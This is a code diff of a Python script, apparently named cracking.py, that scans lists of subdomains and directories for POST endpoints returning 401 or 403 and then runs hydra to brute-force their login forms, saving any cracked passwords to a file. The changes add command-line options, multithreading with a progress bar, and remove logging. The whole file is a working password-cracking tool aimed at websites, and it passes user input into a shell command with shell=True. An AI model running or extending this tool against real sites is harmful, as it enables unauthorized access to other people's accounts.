@@ -1,37 +1,61 @@
-
 """
 This module contains the functions that are used to crack the passwords of the
 websites that require authentication
 It can also be run as a standalone file for the domains listed in output_files/ dir
 """
 
+import argparse
 import sys
 import requests
 import subprocess
-from logger import logger
+from tqdm import tqdm
 from multiprocessing import cpu_count
 from concurrent.futures import ThreadPoolExecutor
+from threading import Lock
 
 
-def bruteForce(post_dirs, input_file):
+def argumentParser():
+	"""
+	Parses the arguments given to the script
+	Returns:
+		arguments (argparse.Namespace): Namespace object containing the arguments
+	"""
+
+	threads = cpu_count() - 2 if cpu_count() > 4 else 1
+	parser = argparse.ArgumentParser(
+		description="Simple script to crack the passwords of websites that require authentication",
+		formatter_class=argparse.RawTextHelpFormatter
+	)
+
+	# Required argument: domain
+	parser.add_argument("-u", "--username", help="Username to be used for the attack\n\n", required=True)
+
+	# Required argument: password_file
+	parser.add_argument("-p", "--password_file", help="Path to the file containing the passwords\n\n", required=True)
+
+	# Optional argument: threads
+	parser.add_argument("-t", "--threads", help=f"Number of threads to be used for the attack (default: {threads})\n\n",
+	                    default=threads, type=int)
+
+	return parser.parse_args()
+
+
+def bruteForce(post_dirs, username, password_file):
 	"""
 	Uses the hydra tool to brute force the login page of the provided url
 	Args:
-	 input_file (str): path to the file containing the passwords
-		post_dirs (list): list of urls that require authentication
+		 post_dirs (list): list of urls that require authentication
+		 username (str): username to be used for the attack
+		 password_file (str): path to the file containing the passwords
 	Returns:
-		None
+		 None
 	"""
-
-	username = "admin"
-	password_file = input_file
 
 	for url in post_dirs:
 		hydra_command = f"hydra -l {username} -P {password_file} {url} http-post-form " \
 		                f"'/:username=^USER^&password=^PASS^:F=incorrect'"
 		output = subprocess.check_output(hydra_command, shell=True)
 		if b"password found" in output:
-			logger.info(f"Password found for {url}")
 			with open("output_files/passwords.bat", "a") as f:
 				f.write(f"{url} - {output.split(b':')[1].decode('utf-8')}")
 
@@ -47,7 +71,6 @@ def checkHydra():
 		subprocess.check_output(["which", "hydra"])
 		return True
 	except subprocess.CalledProcessError:
-		logger.error("Hydra not found on system, cannot proceed with brute force")
 		return False
 
 
@@ -68,10 +91,12 @@ def loadDomainsFromFile():
 	return valid_subdomains, valid_dirs
 
 
-def checkPostDirs(valid_dirs, valid_subdomains):
+def checkPostDirs(valid_dirs, valid_subdomains, pbar, lock):
 	"""
 	Checks which domains in the given lists support POST methods and which ones require authentication
 	Args:
+		pbar (tqdm.tqdm): tqdm progress bar object
+		lock (threading.Lock): lock object to synchronize the threads
 		valid_dirs (list): list of valid directories
 		valid_subdomains (list): list of valid subdomains
 
@@ -79,54 +104,26 @@ def checkPostDirs(valid_dirs, valid_subdomains):
 		post_dirs (list): list of urls that support POST methods and require authentication
 	"""
 
+	# Initialize a list to store the urls that support POST methods and require authentication and add together the
+	# valid directories and subdomains
 	post_dirs = []
+	valid_urls = valid_dirs + valid_subdomains
 
-	for domain in valid_subdomains:
+	for domain in valid_urls:
+		with lock:
+			pbar.update(1)
 		try:
 			post_request = requests.post(domain)
 		except requests.exceptions.ConnectionError:
 			continue
-		if post_request.status_code in [200, 201, 202, 203, 204, 205, 206]:
-			print("Found POST directory that does not require authentication: " + domain + ", not adding to list")
-		elif post_request.status_code in [401, 403]:
+		if post_request.status_code in [401, 403]:
 			post_dirs.append(domain)
-			print("Found POST directory that requires authentication: " + domain)
 
-	for directory in valid_dirs:
-		try:
-			post_request = requests.post(directory)
-		except requests.exceptions.ConnectionError:
-			continue
-		if post_request.status_code in [200, 201, 202, 203, 204, 205, 206]:
-			print("Found POST directory that does not require authentication: " + directory + ", not adding to list")
-		elif post_request.status_code in [401, 403]:
-			post_dirs.append(directory)
-			print("Found POST directory that requires authentication: " + directory)
-
-	return post_dirs
-
-
-def postTask(valid_dirs, valid_subdomains):
-	"""
-	Checks which domains in the given lists support POST methods and which ones require authentication
-	Args:
-		valid_dirs (list): list of valid directories
-		valid_subdomains (list): list of valid subdomains
-
-	Returns:
-		post_dirs (list): list of urls that support POST methods and require authentication
-	"""
-
-	post_dirs = checkPostDirs(valid_dirs, valid_subdomains)
 	return post_dirs
 
 
 def main():
-
-	if len(sys.argv) != 2:
-		sys.exit("Usage: python cracking.py <input_file>")
-	else:
-		input_file = sys.argv[1]
+	args = argumentParser()
 
 	if not checkHydra():
 		print("Hydra not found on system, cannot proceed with brute force")
@@ -135,26 +132,33 @@ def main():
 	valid_subdomains, valid_dirs = loadDomainsFromFile()
 
 	# Divide the lists into chunks for the workers
-	max_workers = cpu_count() - 2 if cpu_count() > 4 else 1
+	max_workers = args.threads
 	divided_dirs = [valid_dirs[i::max_workers] for i in range(max_workers)]
 	divided_subdomains = [valid_subdomains[i::max_workers] for i in range(max_workers)]
 
 	# Create the workers
+	total_iterations = len(valid_dirs) + len(valid_subdomains)
 	workers = []
-	with ThreadPoolExecutor(max_workers=max_workers) as executor:
+
+	# Pass the divided lists to the workers
+	with tqdm(total=total_iterations, desc="Checking URLs for POST support", unit="URLs", dynamic_ncols=True) as pbar, \
+			ThreadPoolExecutor(max_workers=max_workers) as executor:
+		lock = Lock()
 		for i in range(max_workers):
-			workers.append(executor.submit(postTask, divided_dirs[i], divided_subdomains[i]))
+			workers.append(executor.submit(checkPostDirs, divided_dirs[i], divided_subdomains[i], pbar, lock))
 
 	# Merge the results from the workers
 	post_dirs = []
 	for worker in workers:
 		post_dirs.extend(worker.result())
 	if len(post_dirs) == 0:
-		print("No POST directories found that require authentication")
+		print("No POST endpoint found that require authentication")
 	else:
 		print(f"Found {len(post_dirs)} POST directories that require authentication")
 
-	bruteForce(post_dirs, input_file)
+	input_file = args.username
+	password_file = args.password_file
+	bruteForce(post_dirs, input_file, password_file)
 
 
 if __name__ == "__main__":
